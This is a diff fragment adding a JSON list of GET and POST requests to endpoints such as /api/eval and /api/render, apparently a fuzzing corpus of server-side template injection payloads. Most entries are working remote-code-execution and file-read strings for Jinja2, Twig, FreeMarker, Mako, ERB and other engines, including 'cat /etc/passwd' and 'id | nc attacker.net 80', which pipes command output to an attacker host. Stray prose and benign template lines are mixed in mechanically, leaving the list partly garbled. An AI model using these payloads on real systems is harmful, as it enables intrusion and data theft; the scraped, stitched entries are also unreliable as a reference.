+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "{{_self.env.registerUndefinedFilterCallback(\"shell_exec\")}}{%include [\"Y:/A:/\", _self.env.getFilter(\"id\")]|join%} // Error-Based RCE <= 1.19"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "${class.getResource(\"\").getPath()}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "${class.getResource(\"\").getPath()}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "python\n{{4*4}}[[5*5]]\n{{7*'7'}} would result in 7777777\n{{config.items()}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "python\n{{4*4}}[[5*5]]\n{{7*'7'}} would result in 7777777\n{{config.items()}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "{{lipsum.__globals__.os.popen('id').read()}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{{lipsum.__globals__.os.popen('id').read()}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "{php system('nslookup oastify.com')}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "{php system('nslookup oastify.com')}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "In Mako, the following payload can be used to generates the string \"id\": `${str().join(chr(i)for(i)in[105,100])}`."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "In Mako, the following payload can be used to generates the string \"id\": `${str().join(chr(i)for(i)in[105,100])}`."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "${9?lower_abc+4?lower_abc)}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "${9?lower_abc+4?lower_abc)}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{{['nslookup oastify.com']|filter('system')}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{{['nslookup oastify.com']|filter('system')}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "php\n\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@\n{{include(\"wp-config.php\")}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "php\n\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@\n{{include(\"wp-config.php\")}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "</thead>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "</thead>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "= x.exec('id | nc attacker.net 80')"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "= x.exec('id | nc attacker.net 80')"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "Payload represent the string: `id`: `${((char)105).toString()+((char)100).toString()}`."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "Payload represent the string: `id`: `${((char)105).toString()+((char)100).toString()}`."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "[=\"freemarker.template.utility.Execute\"?new()(\"id\")]"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "[=\"freemarker.template.utility.Execute\"?new()(\"id\")]"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "<%=(`nslookup oastify.com`)%>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "<%=(`nslookup oastify.com`)%>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "{{[0]|reduce('system','id')}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "{{[0]|reduce('system','id')}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "{{['id']|map('system')|join}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "{{['id']|map('system')|join}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "python\n{% include 'admin/base.html' %}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "python\n{% include 'admin/base.html' %}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "Convert the returned bytes to ASCII"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "Convert the returned bytes to ASCII"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "<%= Dir.entries('/') %>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "<%= Dir.entries('/') %>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "$templates = new League\\Plates\\Engine('/path/to/templates');"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "$templates = new League\\Plates\\Engine('/path/to/templates');"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "$t->setVar('AUTHOR_EMAIL', $email);"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "$t->setVar('AUTHOR_EMAIL', $email);"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "${\"freemarker.template.utility.Execute\"?new()(\"id && sleep 5\")} // Time-Based RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "${\"freemarker.template.utility.Execute\"?new()(\"id && sleep 5\")} // Time-Based RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "</body>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "</body>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@SecGus](https://twitter.com/SecGus):"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@SecGus](https://twitter.com/SecGus):"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "join(\"\", [\"xx\", shell_exec('id')])()"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "join(\"\", [\"xx\", shell_exec('id')])()"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "ruby\n<%=("
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "ruby\n<%=("
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "${{7*7}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "${{7*7}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "{{config}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "{{config}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "Write the string: `id` using the index position of a known existing string (the index value may vary depending on the target): `{{self.__init__.__globals__.__str__()[1786:1788]}}`."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "Write the string: `id` using the index position of a known existing string (the index value may vary depending on the target): `{{self.__init__.__globals__.__str__()[1786:1788]}}`."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "%x('id') # Rendered RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "%x('id') # Rendered RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "{{_self.env.registerUndefinedFilterCallback(\"shell_exec\")}}{{1/(_self.env.getFilter(\"id && echo UniqueString\")|trim('\\n') ends with \"UniqueString\")}} // Boolean-Based RCE <= 1.19"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{{_self.env.registerUndefinedFilterCallback(\"shell_exec\")}}{{1/(_self.env.getFilter(\"id && echo UniqueString\")|trim('\\n') ends with \"UniqueString\")}} // Boolean-Based RCE <= 1.19"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "system(\"id && sleep 5\") # Time-Based RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "system(\"id && sleep 5\") # Time-Based RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "<#assign classloader=article.class.protectionDomain.classLoader>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "<#assign classloader=article.class.protectionDomain.classLoader>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "{{7*'7'}} would result in 49"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "{{7*'7'}} would result in 49"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": ")%>\n<%= system('cat /etc/passwd') %>\n<%="
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": ")%>\n<%= system('cat /etc/passwd') %>\n<%="
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "'Christian Weiske'  => 'cweiske@php.net',"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "'Christian Weiske'  => 'cweiske@php.net',"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "'Dear' . $_GET['custom_greeting'],"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "'Dear' . $_GET['custom_greeting'],"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "{{this}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{{this}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "groovy\n${\"http://www.google.com\".toURL().text}\n${new URL(\"http://www.google.com\").getText()}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "groovy\n${\"http://www.google.com\".toURL().text}\n${new URL(\"http://www.google.com\").getText()}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "[Official website](https://groovy-lang.org/)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "[Official website](https://groovy-lang.org/)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "java\n{{ someString.toUPPERCASE() }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "java\n{{ someString.toUPPERCASE() }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "<head>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "<head>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "The above injections have been tested on a Flask application."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "The above injections have been tested on a Flask application."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "<body>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "<body>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "python\n{{ messages.storages.0.signer.key }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "python\n{{ messages.storages.0.signer.key }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "[Official website](https://jinja.palletsprojects.com/)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "[Official website](https://jinja.palletsprojects.com/)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "{{['cat$IFS/etc/passwd']|filter('system')}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "{{['cat$IFS/etc/passwd']|filter('system')}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "<title><?=$this->e($title)?></title>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "<title><?=$this->e($title)?></title>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "ruby\n<%= Dir.entries('/') %>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "ruby\n<%= Dir.entries('/') %>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "Refer to [groovy-lang.org/syntax](https://groovy-lang.org/syntax.html) , but `${9*9}` is the basic injection."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "Refer to [groovy-lang.org/syntax](https://groovy-lang.org/syntax.html) , but `${9*9}` is the basic injection."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "{{#with split as |conslist|}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "{{#with split as |conslist|}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "{{dump(app)}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "{{dump(app)}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "python\n<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "python\n<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "1 / (__include__(\"os\").popen(\"id\")._proc.wait() == 0) # Boolean-Based RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "1 / (__include__(\"os\").popen(\"id\")._proc.wait() == 0) # Boolean-Based RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "{{'a'.toUpperCase()}} would result in 'A'"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "{{'a'.toUpperCase()}} would result in 'A'"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "[\"\"][0 + !(global.process.mainModule.require(\"child_process\").spawnSync(\"id\", options={shell:true}).status===0)][\"length\"]"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "[\"\"][0 + !(global.process.mainModule.require(\"child_process\").spawnSync(\"id\", options={shell:true}).status===0)][\"length\"]"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "<#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "<#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "Access `__globals__` and `__builtins__`:"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "Access `__globals__` and `__builtins__`:"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "> Java EL payloads also work for SpEL"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "> Java EL payloads also work for SpEL"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "Hello {NAME}.<br/>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "Hello {NAME}.<br/>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "php\n{{ {'id':'shell_exec'}|map('call_user_func')|join }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "php\n{{ {'id':'shell_exec'}|map('call_user_func')|join }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "const _ = require('lodash');"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "const _ = require('lodash');"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{{/each}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{{/each}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "Bypassing `_`"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "Bypassing `_`"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "Bypassing `[` and `]`"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "Bypassing `[` and `]`"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "{{['id']|map('passthru')}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "{{['id']|map('passthru')}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "Bypassing `|join`"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "Bypassing `|join`"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "It contains another template."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "It contains another template."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "$t->setBlock('authors', 'authorline', 'authorline_ref');"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "$t->setBlock('authors', 'authorline', 'authorline_ref');"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "python\n{% debug %}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "python\n{% debug %}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "<head><title>{PAGE_TITLE}</title></head>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "<head><title>{PAGE_TITLE}</title></head>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "Source: [jinja.palletsprojects.com](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "Source: [jinja.palletsprojects.com](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "echo $t->finish($t->parse('OUT', 'authors'));"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "echo $t->finish($t->parse('OUT', 'authors'));"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "string = \"{{= username}}\""
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "string = \"{{= username}}\""
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "__include__(\"os\").popen(\"id && sleep 5\").read() # Time-Based RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "__include__(\"os\").popen(\"id && sleep 5\").read() # Time-Based RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "$t->parse('authorline_ref', 'authorline', true);"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "$t->parse('authorline_ref', 'authorline', true);"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "${...}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "${...}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "File.read(\"Y:/A:/\"+%x('id')) # Error-Based RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "File.read(\"Y:/A:/\"+%x('id')) # Error-Based RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "${dwf.newInstance(ec,null)(\"id\")}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "${dwf.newInstance(ec,null)(\"id\")}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "- Method using `java.lang.Runtime` #1 - accessed with JavaClass"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "- Method using `java.lang.Runtime` #1 - accessed with JavaClass"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "$t->setVar('AUTHOR_NAME', $name);"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "$t->setVar('AUTHOR_NAME', $name);"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "Listen for connection"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "Listen for connection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "system('id && sleep 5')"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "system('id && sleep 5')"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "{{ '<script>alert(3)</script>' }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "{{ '<script>alert(3)</script>' }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "evaluate: /\\{\\{(.+?)\\}\\}/g,"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "evaluate: /\\{\\{(.+?)\\}\\}/g,"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "</table>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "</table>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "echo $templates->render('profile', ['name' => 'Jonathan']);"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "echo $templates->render('profile', ['name' => 'Jonathan']);"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "<?php $this->layout('template', ['title' => 'User Profile']) ?>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "<?php $this->layout('template', ['title' => 'User Profile']) ?>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "java\n    ${T(java.lang.Runtime).getRuntime().exec(\"COMMAND_HERE\")}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "java\n    ${T(java.lang.Runtime).getRuntime().exec(\"COMMAND_HERE\")}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "<%= `ls /` %>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "<%= `ls /` %>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "fopen(join(\"\", [\"Y:/A:/\", shell_exec('id')]), \"r\")"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
